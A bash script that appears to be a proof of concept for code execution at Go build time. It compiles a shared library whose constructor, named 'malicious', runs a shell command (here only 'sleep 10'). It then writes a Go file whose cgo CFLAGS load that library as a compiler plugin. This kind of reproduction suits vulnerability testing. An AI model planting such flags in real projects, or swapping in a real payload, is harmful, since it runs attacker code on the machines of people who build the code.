#!/bin/bash

echo "Writing attack.c"

cat <<EOF> attack.c
#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("sleep 10");
}
EOF

echo "Building Attack SO from Sleep"

gcc -shared -o attack.so -fPIC attack.c

# echo "Deleting sleep.c"
# rm sleep.c
echo "Writing main.go"

cat <<EOF> main.go
package main
// #cgo CFLAGS: -fplugin=./attack.so
// typedef int (*intFunc) ();
//
// int
// bridge_int_func(intFunc f)
// {
//      return f();
// }
//
// int fortytwo()
// {
//      return 42;
// }
import "C"
import "fmt"

func main() {
    f := C.intFunc(C.fortytwo)
    fmt.Println(int(C.bridge_int_func(f)))
    // Output: 42
}
EOF

chown 1000:1000 main.go
chown 1000:1000 attack.so

echo "Done."
